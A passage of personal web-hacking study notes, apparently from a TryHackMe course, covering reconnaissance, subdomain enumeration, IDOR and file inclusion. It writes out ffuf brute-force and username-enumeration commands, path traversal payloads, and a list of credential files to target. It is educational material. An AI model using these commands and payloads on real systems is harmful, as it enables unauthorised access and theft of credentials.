href="#878c09f1-08d7-428a-b9d3-0733e2b6ea5d">Allow List</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#16fd787d-3256-4f2c-b7d8-222b7e7bb99b">Open Redirect</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#37967981-9f8e-4e50-af07-629db0119a63"><em><mark class="highlight-yellow_background">XSS - Cross-site Scripting</mark></em></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#120cfb68-51d9-4dc3-8413-61d7dbde2b5f"><mark class="highlight-blue">Reflected XSS</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c5bae24e-d2cd-46a0-86c4-fc58ce9bba33"><strong>Potential Impact</strong>:</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#9e96d280-e2e8-42ca-a3f7-2168e01c8e86"><mark class="highlight-blue"><strong>Stored XSS</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#01e63203-83af-4325-82bc-2eb31e88edd8"><mark class="highlight-blue"><strong>DOM (</strong></mark><strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odel<mark class="highlight-blue"><strong>) Based XSS</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4f132881-f4bf-451e-810d-a8525425faaf"><mark class="highlight-blue">Blind XSS</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#8d6d194e-9209-4215-b8ad-1293eb051f5f"><em><mark class="highlight-yellow_background">Command Injection</mark></em></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ec82291f-d09a-4587-8657-0f4b4e1aab08"><mark class="highlight-blue">Exploiting</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#4776b451-e482-48e2-84eb-b10688006475">Detecting Blind Command Injection</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b92b1d2b-496a-4f40-98c9-b2b56cf85689">Detecting Verbose Command Injection</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cbff7ac1-ae74-4956-9067-cac185fd12d2"><mark class="highlight-pink">Useful payload</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a744e2ae-e050-4bad-bcf3-2849d784906b"><mark class="highlight-blue">Remediating</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#78e9449d-9206-4d74-b53c-1041b7044eb1"><strong>Input sanitisation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#8d47ef0c-b92b-47c1-a660-1cee5046d56c">Bypassing Filters</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d4a33a3b-f3e9-4d00-bb5f-384509e10646"><em><mark class="highlight-yellow_background">SQL (Structured Query Language) Injection</mark></em></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6101464a-8aab-47f6-8c1b-96361075d8a6">DataBases Structure</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2116616b-6a1d-465f-84af-0c7414dc6b7c">Tables Structure</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#af3df270-a31c-4cf6-a8cf-b221453b0683"><mark class="highlight-yellow">Make sure to read: </mark><mark class="highlight-yellow"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><span style="border-bottom:0.05em solid">SQL Brief</span></a></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#76ca5650-c304-4a5d-aa0b-0bd975aa8c29"><strong><mark class="highlight-blue">SQL Injectoin</mark></strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f01598a4-d60b-42ca-a056-ec180a7d2a25"><mark class="highlight-blue"><strong>In-Band SQL Injection</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18d47b94-84ba-4875-abeb-f05618fb4be9"><strong>Error-Based SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c3b19cd6-7a28-407a-b35e-18cc9e02e88f"><strong>Union-Based SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5473cb67-dd56-4bc4-b4ca-30d5a840e546"><mark class="highlight-blue"><strong>Remediation</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e59cf230-702e-4436-a2ac-f1119242bc2d"><strong>Prepared Statements (With Parameterized Queries):</strong></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#7ef62935-a5eb-4d5d-8c79-0d8c8bfead36"><strong>Input Validation:</strong></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#bb6f9474-2118-4112-95d9-b6b1b8487a9e"><strong>Escaping User Input:</strong></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#09b6c3d8-4ee1-4ee2-bc9a-9331731e6277"><a href="https://tryhackme.com/p/Ponexen"><mark class="highlight-purple">By</mark></a><a href="https://tryhackme.com/p/Ponexen">|</a><mark class="highlight-purple"> </mark> 🇵🇸 <a href="https://www.notion.so/Try-Hack-Me-7b33b0000bea4464bae0ccb3020f8057"><strong><mark class="highlight-red"><em>Mohanad Ehab Badra</em></mark></strong></a><strong><mark class="highlight-red"><em> </em></mark></strong>☪️💚</a></div></nav><h1 id="f7f96f79-3e1f-4545-bfd2-1b47b61ec120" class=""><mark class="highlight-yellow_background"><em><strong>Walking An Application</strong></em></mark></h1><h3 id="4270903d-cb77-4cc5-9bee-224686d48e9f" class="">Some important in-built browser tools:</h3><h2 id="9e45a55c-79ff-4efe-be26-a245276f8da5" class=""><mark class="highlight-blue"><strong>View Source</strong></mark></h2><p id="3ac843a4-02d0-425b-82cc-8f32261b25b9" class="">Use your browser to view the human-readable source code of a website.</p><h2 id="936228b1-395c-4dcd-a5c8-ac5e5c1a2b98" class=""><mark class="highlight-blue"><strong>Inspector</strong></mark></h2><p id="fa4b0ab3-a96b-483c-a1f1-b7a52f2dca87" class="">inspect page elements and make changes.</p><h2 id="5a8350eb-1bfe-4222-8cd7-68072b6b68bd" class=""><mark class="highlight-blue"><strong>Sources - Debugger</strong></mark></h2><p id="b1a86f38-ead8-4b4d-8949-a14be7d6b3c1" class="">Inspect and control the flow of a page&#x27;s JavaScript.</p><h2 id="6f58cdd8-4cfe-4a10-9b64-4962a96d72cd" class=""><mark class="highlight-blue"><strong>Network</strong></mark></h2><p id="8cef5f21-0a03-49c2-80c8-9d91618930bf" class="">See all the network requests a page makes.</p><h1 id="98ce8543-23a4-4d7c-8ad6-29c8516e633e" class=""><mark class="highlight-yellow_background"><em><strong>Content Discovery </strong></em></mark></h1><p id="f4de0b11-9fe2-4532-9465-54d06d442420" class="">Is three methods: Manually, Automated, OSINT.</p><h2 id="6bb82161-30bf-447c-9234-134ebc0bc2fa" class=""><mark class="highlight-blue">Manually</mark></h2><h3 id="5cd84c8a-b5b0-45d6-b8ec-ef0f3ed88244" class="">robots.txt → <code>example.com/</code><span style="border-bottom:0.05em solid"><code>robots.txt</code></span></h3><p id="9cc93f65-a844-482b-a716-e160394d589d" class="">Telling the search engines what paths to show and what not.</p><h3 id="e6342cef-452a-4182-acaa-d14928e10b00" class="">Favicon → The <span style="border-bottom:0.05em solid">default icons</span> may show the website <span style="border-bottom:0.05em solid">Framework</span></h3><p id="068ca8b5-5d7f-4acc-8d40-6cb751d4e8b2" class="">We can use database of frameworks’ icons md5: <a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">OWASP favicon database - OWASP</a></p><p id="061a255a-f4dd-468e-b07a-60851fe8c39d" class="">To Get the icon’s md5 to search in the database:</p><p id="c5edeec0-0130-4074-b30a-25c61cd29476" class=""><code><strong>$ </strong></code><code>curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.icon | md5sum</code></p><h3 id="2e6d1e68-432b-462a-b4bb-0f4582053cfe" class="">Sitemap → <code>example.com/</code><code><span style="border-bottom:0.05em solid">sitemap.xml</span></code></h3><p id="a230316e-6c1c-4627-a03c-78f0a781fa31" class="">sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine.</p><h3 id="88d48d29-12a3-4bf0-8e7e-decad1e0a175" class="">HTTP Header → The server returns it when request him</h3><p id="0a6b11d7-8eb8-4443-a706-89a681852f67" class="">These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use.</p><p id="41895230-e57a-4fac-8053-59e13355a7af" class="">To get the details of the <span style="border-bottom:0.05em solid">http header</span> we using the flag “-v” with the curl tool:</p><p id="86200ef1-cc8e-4d68-9555-10a31a75280d" class=""><code><strong>$</strong></code><code> curl http://example.com </code><span style="border-bottom:0.05em solid"><code>-v</code></span></p><h2 id="b5b4d6e0-314a-488a-b7d4-373bd776d516" class=""><mark class="highlight-blue">OSINT (Open-Source Instance)</mark></h2><h3 id="fbcbd5dc-c6a3-480b-af2c-a8ccbb0fe731" class="">Google Hacking / Dorking</h3><p id="ec94e224-cff7-4d99-8da1-9239d4dd9ee3" class="">Utilizes Google&#x27;s advanced search engine features, which allow you to pick out custom content.</p><p id="b4b5d2f5-c2bc-443b-ba0a-3b138571b211" class="">searching on google by using:</p><table id="0742a626-3767-4c2e-88f5-e2ba2f50ae5e" class="simple-table"><tbody><tr id="68e0d97c-f461-48e0-bfd3-ecd5510e70e0"><td id="egZ]" class="" style="width:156px"><strong>Filter</strong></td><td id="`dwv" class="" style="width:165.421875px"><strong>Example</strong></td><td id="@Dt&lt;" class="" style="width:371.9921875px"><strong>Description</strong></td></tr><tr id="773438ed-304f-480d-ad68-ab12bbdaffb5"><td id="egZ]" class="" style="width:156px">site</td><td id="`dwv" class="" style="width:165.421875px">site:tryhackme.com</td><td id="@Dt&lt;" class="" style="width:371.9921875px">returns results only from the specified website address</td></tr><tr id="46fc7a84-e6c2-4285-84a5-2b3651dc6f8e"><td id="egZ]" class="" style="width:156px">inurl</td><td id="`dwv" class="" style="width:165.421875px">inurl:admin</td><td id="@Dt&lt;" class="" style="width:371.9921875px">returns results that have the specified word in the URL</td></tr><tr id="fdadacce-bfd5-4efd-add0-60e69b1ee104"><td id="egZ]" class="" style="width:156px">filetype</td><td id="`dwv" class="" style="width:165.421875px">filetype:pdf</td><td id="@Dt&lt;" class="" style="width:371.9921875px">returns results which are a particular file extension</td></tr><tr id="bd17fd5b-cadd-48c5-be14-f9fecfffedd9"><td id="egZ]" class="" style="width:156px">intitle</td><td id="`dwv" class="" style="width:165.421875px">intitle:admin</td><td id="@Dt&lt;" class="" style="width:371.9921875px">returns results that contain the specified word in the title</td></tr></tbody></table><p id="87a91fbe-c05f-4bd9-b15c-b0bdbeeba33e" class="">for more details: <a href="https://www.notion.so/Try-Hack-Me-7b33b0000bea4464bae0ccb3020f8057"><strong>Refine web searches</strong></a><strong>.</strong></p><h3 id="e6b8ea73-7d9a-47f7-87bb-5f0626ddfc6c" class=""><strong>Wappalyzer</strong></h3><p id="eed16b56-5e79-4877-9389-38828f54e031" class=""><a href="https://www.wappalyzer.com/">Wappalyzer</a> is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.</p><h3 id="ac5dbe43-ae23-407d-a113-5da3d3ddcc56" class=""><strong>Wayback Machine</strong></h3><p id="32a85b64-35b6-4efe-a91f-80d74f414073" class=""><a href="https://archive.org/web/">The Wayback Machine</a> is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.</p><h2 id="45b88f74-1cc1-43b5-ad47-46202add29b9" class=""><mark class="highlight-blue">Automated - Tools</mark></h2><p id="abdccb3a-efba-4ed7-84c9-0706e28b0881" class="">Automated discovery is the process of using tools to discover content, sending a lot of requests, These requests check whether a file or directory exists on a website, This process is made possible by using a resource called wordlists.</p><p id="c22fd69e-7b4f-4ca2-94e4-4c3545c3d09e" class="">There are many different content discovery tools available, like:</p><h3 id="769013e6-717a-4159-aec2-4db47e00086b" class="">drib</h3><p id="d21d1b32-ef84-42bd-994e-71144c9518f2" class="">Usage: <code>dirb http://example.com/ wordlist.txt</code></p><h3 id="6e9c717b-c2c4-486e-9dfe-4d9650b7e4e1" class="">gobuster</h3><p id="d0600044-32eb-48e1-81d4-6dce85d27516" class="">Usage: <code>gobuster dir --url http://example.com -w wordlist.txt</code></p><h1 id="61ae9806-0bb1-460e-a688-532f43f483f7" class=""><em><mark class="highlight-yellow_background"><strong><strong>Subdomain Enumeration</strong></strong></mark></em></h1><p id="3c8ef282-df2c-4534-80db-cd7e46febe56" class="">Subdomain enumeration methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host.</p><h2 id="9f6955b7-0c59-4293-bab9-75d1b873fbab" class=""><mark class="highlight-blue">OSINT</mark></h2><h3 id="b32446ed-ae5d-44c9-bf88-f089b642beec" class=""><strong>SSL/TLS Certificates</strong></h3><p id="9fec1744-6ef6-42a7-a517-89a24f8fb5ea" class="">SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA&#x27;s take part in what&#x27;s called &quot;Certificate Transparency (CT) logs&quot;. These are publicly accessible logs of every SSL/TLS certificate created for a domain name.</p><p id="cc91f41c-3837-4afb-a6ba-9873a4161a0f" class="">We can use this service to our advantage to discover subdomains belonging to a domain, sites like:<div class="indented"><p id="fea0e885-5fe9-4d62-822e-421d5367d6ca" class=""><mark class="highlight-red"><a href="https://crt.sh"><strong> crt.sh</strong></a></mark><mark class="highlight-red"><strong> </strong></mark>and <a href="https://ui.ctsearch.entrust.com/ui/ctsearchui"><strong><mark class="highlight-red">Certificate Transparency Search Tool</mark></strong></a>.</p></div></p><h2 id="8313a7c5-bb5c-4a8d-8c18-872606e3d3d6" class=""><mark class="highlight-blue">Search Engines</mark></h2><p id="bdadf900-0dc0-4b18-a1b2-df29f3def537" class="">Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, <code>site:*.domain.com</code>.</p><h2 id="b82a3edd-d57c-4d84-b62a-29cb4b6ed29e" class=""><mark class="highlight-blue">dnsreacon</mark></h2><p id="642bfd47-13b0-41c5-a583-b524fcb0caff" class="">Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we can use a tool called <mark class="highlight-red"><strong>dnsrecon</strong></mark><strong>.</strong></p><h2 id="3a2a6787-c221-4b45-9a76-8269272b7c5d" class=""><mark class="highlight-blue">Sublist3r</mark></h2><p id="21950d3b-6aae-4d1b-a987-51437b6380d4" class="">To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like <mark class="highlight-red"><strong><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></strong></mark>.</p><h2 id="00069e86-c11a-46d6-b243-aac38d90eb55" class=""><mark class="highlight-blue">Virtual Hosts</mark></h2><p id="0d9952a3-4f97-4074-a1a2-3564893c1280" class="">Some subdomains aren&#x27;t always hosted in publically accessible DNS
+results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server.</p><p id="2ae9c0b6-ff8b-4b1e-9ca1-7e1c8761f9e2" class="">Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the <strong>Host</strong>
+ header. We can utilise this host header by making changes to it and monitoring the response to see if we&#x27;ve discovered a new website.</p><p id="78feacd5-70b0-4395-bf11-12f52f884210" class="">Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.</p><h3 id="2229aee2-3003-486a-bc02-438b567866d7" class=""><strong><mark class="highlight-red">FFUF</mark></strong></h3><p id="8d961eb8-5885-4b2d-a51f-5bcad97c17c9" class="">A great tool to discover subdomains using the Virtual Hosts method, can use it to <a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2.html">Automate</a> the <a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2.html">Content Discovery</a> and others things too.</p><p id="1cf8254b-5bc1-4cea-9edb-5d8c65fbb1ea" class="">Usage: <code>$ ffuf -w wordlist.txt -H &quot;Host: FUZZ.example.com&quot; -u http://example.com</code></p><h1 id="7d5493ed-550f-4eff-b6cf-0e835d2a9b05" class=""><strong><mark class="highlight-yellow_background"><em>Authentication Bypass</em></mark></strong></h1><h2 id="69b8cc66-b294-4f2e-89e8-ea2ea9e476b9" class=""><mark class="highlight-blue">Username Enumeration</mark></h2><p id="096d1197-68f3-44d9-a052-f575ab7ec8dc" class="">If you try entering the username <strong>admin </strong>you&#x27;ll see we get the error <strong>An account with this username already exists</strong>. We can use the existence of this error message to produce a list of used usernames.</p><h3 id="ed98c1a2-1011-4907-b567-eb97554b3886" class=""><mark class="highlight-red">With FFUF</mark></h3><p id="68fd1860-73ca-47d7-8c40-fbadf271dc3a" class="">-w wordlist.txt of usernames | -X HTTP method to use | -d POST data | -H HTTP Header <code>&quot;Name: Value&quot;</code> | -u http://example.com | -mr Match regexp.</p><p id="555e596b-1057-44f7-96b7-f19e60c5a8d5" class="">EX: <code><strong>$ </strong></code><code>ffuf -w /usr/share/wfuzz/wordlist/others/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.11.212/customers/signup -mr &quot;username already exists&quot;</code></p><h2 id="41904720-9699-4297-9a19-a1f90ad2de32" class=""><mark class="highlight-blue">Brute Force</mark></h2><p id="d0843e5d-4fdb-4e8d-8fe5-0629b76d9829" class="">A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.</p><h3 id="a0b1fe77-df13-4cdf-8252-47895c8f1435" class=""><mark class="highlight-red">With FFUF</mark></h3><p id="abca7f95-616b-42a4-91a4-216f0aacde8b" class="">-w wordlist1.txt:H1,wordlist2.txt:H2 → H1 (first list) H2 (second list) | -fc → Filter HTTP response size.</p><p id="51d6bba2-882c-4f19-91a9-434670c2d0d5" class=""><code><strong>$</strong></code><code> ffuf -w valid_usernames.txt:W1,passwords.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.11.212/login -fc 200</code></p><h1 id="fa0eaf11-0cc6-4a8a-8455-151bd018cd34" class=""><em><mark class="highlight-yellow_background">IDOR (Insecure Direct Object Reference)</mark></em></h1><p id="09ba9498-cca9-4a78-b733-f08403262e37" class="">Is a type of access control vulnerability.</p><p id="170a2d91-bf7f-4669-9568-60d1a02d8434" class="">This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.</p><h2 id="00984327-4d06-4b82-8ea5-7d1a3700511a" class=""><mark class="highlight-blue">Try changing the user id value: </mark></h2><p id="3107b264-2708-4564-a8b7-73177baab110" class="">EX: <mark class="highlight-teal">http://online-service.thm/profile?user_id=</mark><span style="border-bottom:0.05em solid"><strong><mark class="highlight-teal">1305</mark></strong></span><mark class="highlight-teal"> </mark>→ <mark class="highlight-red">http://online-service.thm/profile?user_id=</mark><span style="border-bottom:0.05em solid"><strong><mark class="highlight-red">1000</mark></strong></span></p><p id="2c51e1dd-b879-4e1e-ae26-a791bcf158c8" class="">If you can now see another user&#x27;s information, <span style="border-bottom:0.05em solid">You&#x27;ve now discovered an IDOR vulnerability!</span></p><h2 id="8b61d5a0-97f9-4f11-a61e-c1ca8d4a8201" class=""><mark class="highlight-blue">IDORs in encoded IDs</mark></h2><p id="116d7508-48a9-4e63-9169-7112863c1262" class="">When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it.</p><p id="50bff9ba-ac60-4773-93a4-df19ff8e69ff" class="">decode the string, then edit the data and re-encode it again and then resubmit the web request to see if there is a change in the response. [common type of encoding: <strong>BASE64</strong>]</p><figure id="f162ca1a-79b2-4d48-988a-551de3e69fea" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5f2cbe5c4ab4a274420bc9a9afc9202d.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5f2cbe5c4ab4a274420bc9a9afc9202d.png"/></a></figure><h2 id="e1ff37e9-769a-4401-84ea-7da15b6a8252" class=""><mark class="highlight-blue">Hashed IDs</mark></h2><p id="6d8a3fd7-dcf7-4129-8b1f-b46d3a2f3276" class="">Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value. For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.[common algorithm: <strong>MD5]</strong></p><h2 id="646eaa5b-7174-4126-b2aa-9b5b55772f6c" class=""><mark class="highlight-blue"><strong><strong>Unpredictable IDs</strong></strong></mark></h2><p id="f4076e63-b421-4427-9a80-2ba1efd0b32d" class="">an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users&#x27; content using their Id number while still being logged in with a different account (or not logged in at all), you&#x27;ve found a valid IDOR vulnerability.</p><p id="d8f2e734-c21e-49a1-9d1f-93b2a2012e91" class=""><strong><mark class="highlight-yellow">The vulnerable endpoint you&#x27;re targeting may not always be something you see in the address bar.</mark></strong></p><p id="a48c762a-c22d-47f2-8d47-d4dd9c462616" class=""><em>It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.</em></p><h1 id="e787346c-d1c2-44bc-a161-a4f95103284f" class=""><em><mark class="highlight-yellow_background"><strong>File Inclusion</strong></mark></em></h1><p id="4b161d0d-1ed5-407a-b0cc-38936fbca97f" class="">File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are <mark class="highlight-red"><strong>not sanitized or validated</strong></mark>, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.</p><p id="4684363f-5f49-4779-a24d-1adb33b072ff" class="">In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following graph explains and breaking down the essential parts of the URL.</p><figure id="9c029601-6981-447e-8097-71501fd8ac3a" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png"/></a></figure><p id="ff695ad1-e6f4-4040-b5e5-663fd951d04c" class="">If a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.</p><figure id="3056aa38-cb29-46bf-8cbe-8dccfde53a87" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png"/></a></figure><p id="7138b283-2315-4d9c-b0e4-66636ec0190b" class=""><strong>If the attacker somehow can write to the server such as /tmp directory, then it is possible to gain remote command execution RCE.</strong></p><h2 id="881a8dc1-c65b-4b5e-a91c-932dc8d73556" class=""><mark class="highlight-blue"><strong>Path Traversal</strong></mark></h2><p id="341d96e6-3618-4787-a49f-28ce2006d796" class="">Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application.</p><p id="b7b2ddad-5ea6-475c-967e-de12c3a62861" class="">Path traversal vulnerabilities occur when the user&#x27;s input is passed to a function such as file_get_contents in PHP. It&#x27;s important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability.</p><p id="a9119f8a-8377-4fb7-b537-7c3908b84164" class="">The following graph shows how a web application stores files in /var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs.</p><figure id="5577a0c6-9e4b-46bb-8113-fc9ae12b0a23" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/45d9c1baacda290c1f95858e27f740c9.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/45d9c1baacda290c1f95858e27f740c9.png"/></a></figure><p id="72352555-d3c3-4dd9-b476-2aa4cc48f4cf" class="">We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, <code>http://webapp.thm/get.php</code><code><mark class="highlight-red"><strong>?file=../../../../etc/passwd</strong></mark></code><strong>.</strong></p><p id="79801809-c7aa-4be5-ad6e-3594b5865e40" class="">Suppose there isn&#x27;t input validation, and instead of accessing the PDF files at /var/www/app/CVs location, the web application retrieves files from other directories, which in this case /etc/passwd. Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to /etc, and from there, it read the passwd file.</p><figure id="aa040ed3-cad8-4c48-8573-9228ead579f9" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png"/></a></figure><p id="f5c1a24a-42b9-47d0-aca6-1db49437c91c" class="">Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:</p><p id="df726637-3bd9-4cec-ba5b-018918a1b58d" class=""><code>http://webapp.thm/get.php</code><mark class="highlight-red"><strong><code>?file=../../../../boot.ini or</code></strong></mark></p><p id="38cace1c-13d8-43b1-b172-03779ee6701d" class=""><code>http://webapp.thm/get.php</code><mark class="highlight-red"><strong><code>?file=../../../../windows/win.ini</code></strong></mark></p><table id="d7f0d99d-73b3-4915-a9e5-450250df4d66" class="simple-table"><tbody><tr id="dc88e16a-c734-45bc-92ab-98fd583f77eb"><td id="FMzA" class=""><strong>Location</strong></td><td id="Wsj?" class="" style="width:550.9807739257812px"><strong>Description</strong></td></tr><tr id="9ff3f9d4-b134-4301-bb44-f36b553b4529"><td id="FMzA" class="">/etc/issue</td><td id="Wsj?" class="" style="width:550.9807739257812px">contains a message or system identification to be printed before the login prompt.</td></tr><tr id="40916a22-93e2-4f8a-a1d8-c750a3995406"><td id="FMzA" class="">/etc/profile</td><td id="Wsj?" class="" style="width:550.9807739257812px">controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</td></tr><tr id="381f0fa7-2b67-477e-bdf5-fcc58250fb0c"><td id="FMzA" class="">/proc/version</td><td id="Wsj?" class="" style="width:550.9807739257812px">specifies the version of the Linux kernel</td></tr><tr id="b96a2ed6-cac6-4ae3-9187-cb81d8b90459"><td id="FMzA" class="">/etc/passwd</td><td id="Wsj?" class="" style="width:550.9807739257812px">has all registered user that has access to a system</td></tr><tr id="0b87610d-34da-4f40-a34c-dc806f8ee03a"><td id="FMzA" class="">/etc/shadow</td><td id="Wsj?" class="" style="width:550.9807739257812px">contains information about the system&#x27;s users&#x27; passwords</td></tr><tr id="fa9fea9c-7adc-428a-afb4-63dc1e827a9c"><td id="FMzA" class="">/root/.bash_history</td><td id="Wsj?" class="" style="width:550.9807739257812px">contains the history commands for root user</td></tr><tr id="344f2bdc-8b15-4536-9cf4-db54e690afa3"><td id="FMzA" class="">/var/log/dmessage</td><td id="Wsj?" class="" style="width:550.9807739257812px">contains global system messages, including the messages that are logged during system startup</td></tr><tr id="a626e7f7-0ea2-4344-9a59-47fea1e6a5b4"><td id="FMzA" class="">/var/mail/root</td><td id="Wsj?" class="" style="width:550.9807739257812px">all emails for root user</td></tr><tr id="6740bfa2-c518-4cf5-babf-02e7cf60223f"><td id="FMzA" class="">/root/.ssh/id_rsa</td><td id="Wsj?" class="" style="width:550.9807739257812px">Private SSH keys for a root or any known valid user on the server</td></tr><tr id="5cf85a15-56a5-4c71-9f49-e5db6d637faa"><td id="FMzA" class="">/var/log/apache2/access.log</td><td id="Wsj?" class="" style="width:550.9807739257812px">the accessed requests for Apache  webserver</td></tr><tr id="272a6838-8139-456f-ad5f-91ebaaa20020"><td id="FMzA" class="">C:\boot.ini</td><td id="Wsj?" class="" style="width:550.9807739257812px">contains the boot options for computers with BIOS firmware</td></tr></tbody></table><h2 id="ace4d55a-6b5f-45a5-ba7a-eb01b065a26c" class=""><mark class="highlight-blue">LFI - Local File Inclusion</mark></h2><p id="a6a0a880-c459-49c6-9880-263749593457" class="">LFI attacks against web applications are often due to a developers&#x27; lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications.</p><h3 id="c39576e0-26e5-402c-ac6f-1eb86d6ff4a8" class="">1. <code>Including: /etc/passwd</code></h3><p id="f2490776-884e-4b42-bf5a-0d202e3aa079" class="">Suppose the web application provides two languages, and the user can select between the EN and 